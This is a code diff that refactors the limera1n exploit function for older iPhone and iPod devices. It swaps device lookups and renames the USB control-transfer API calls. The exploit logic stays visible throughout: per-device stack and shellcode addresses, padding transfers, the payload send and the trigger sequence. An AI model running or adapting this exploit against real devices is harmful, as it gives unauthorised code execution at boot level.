@@ -42,15 +42,24 @@ int limera1n_exploit(struct irecv_device *device, irecv_client_t *pclient)
 	unsigned int shellcode_address = 0;
 	unsigned int shellcode_length = 0;
 
-	if (device->chip_id == irecv_devices[DEVICE_IPHONE4].chip_id) {
+	irecv_device_t iphone4 = NULL;
+	irecv_device_t iphone3gs = NULL;
+	irecv_device_t ipod3g = NULL;
+	int mode = 0;
+
+	irecv_devices_get_device_by_product_type("iPhone3,1", &iphone4);
+	irecv_devices_get_device_by_product_type("iPhone2,1", &iphone3gs);
+	irecv_devices_get_device_by_product_type("iPod3,1", &ipod3g);
+
+	if (device->chip_id == iphone4->chip_id) {
 		max_size = 0x2C000;
 		stack_address = 0x8403BF9C;
 		shellcode_address = 0x8402B001;
-	} else if (device->chip_id == irecv_devices[DEVICE_IPHONE3GS].chip_id) {
+	} else if (device->chip_id == iphone3gs->chip_id) {
 		max_size = 0x24000;
 		stack_address = 0x84033FA4;
 		shellcode_address = 0x84023001;
-	} else if (device->chip_id == irecv_devices[DEVICE_IPOD3G].chip_id) {
+	} else if (device->chip_id == ipod3g->chip_id) {
 		max_size = 0x24000;
 		stack_address = 0x84033F98;
 		shellcode_address = 0x84023001;	
@@ -82,23 +91,23 @@ int limera1n_exploit(struct irecv_device *device, irecv_client_t *pclient)
 	}
 
 	debug("Sending chunk headers\n");
-	irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 1000);
+	irecv_usb_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 1000);
 
 	memset(buf, 0xCC, 0x800);
 	for(i = 0; i < (max_size - (0x800 * 3)); i += 0x800) {
-		irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 1000);
+		irecv_usb_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 1000);
 	}
 
 	debug("Sending exploit payload\n");
-	irecv_control_transfer(client, 0x21, 1, 0, 0, shellcode, 0x800, 1000);
+	irecv_usb_control_transfer(client, 0x21, 1, 0, 0, shellcode, 0x800, 1000);
 
 	debug("Sending fake data\n");
 	memset(buf, 0xBB, 0x800);
-	irecv_control_transfer(client, 0xA1, 1, 0, 0, buf, 0x800, 1000);
-	irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 10);
+	irecv_usb_control_transfer(client, 0xA1, 1, 0, 0, buf, 0x800, 1000);
+	irecv_usb_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 10);
 
 	//debug("Executing exploit\n");
-	irecv_control_transfer(client, 0x21, 2, 0, 0, buf, 0, 1000);
+	irecv_usb_control_transfer(client, 0x21, 2, 0, 0, buf, 0, 1000);
 
 	irecv_reset(client);
 	irecv_finish_transfer(client);
@@ -110,7 +119,10 @@ int limera1n_exploit(struct irecv_device *device, irecv_client_t *pclient)
 		error("Unable to reconnect\n");
 		return -1;
 	}
-	if ((*pclient)->mode != kDfuMode) {
+
+	irecv_get_mode((*pclient), &mode);
+
+	if (mode != IRECV_K_DFU_MODE) {
 		error("Device reconnected in non-DFU mode\n");
 		return -1;
 	}
